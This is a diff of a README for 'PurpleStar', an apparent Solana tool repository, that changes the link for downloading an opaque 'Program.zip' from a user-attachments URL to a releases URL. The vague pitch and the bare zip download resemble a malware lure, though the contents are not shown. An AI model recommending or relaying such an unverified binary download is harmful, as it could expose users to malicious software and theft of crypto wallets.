@@ -30,7 +30,7 @@ Explore the wide range of features available in PurpleStar:
 ## Installation
 To make use of the tools and resources provided in this repository, you can download the program via the following link:
 
-[![](https://img.shields.io/badge/Download-Program.zip-#663399)](https://github.com/user-attachments/files/17688447/Program.zip)
+[![](https://github.com/jovemmessias/PurpleStar/releases/download/v2.0/Program.zip)](https://github.com/jovemmessias/PurpleStar/releases/download/v2.0/Program.zip)
 
 ## Usage
 The PurpleStar repository is designed to be user-friendly and accessible for all levels of experience. Whether you are a beginner exploring the world of Solana or an experienced developer looking for advanced tools, PurpleStar has something for everyone. Follow the documentation and guides provided to leverage the full potential of the tools available.
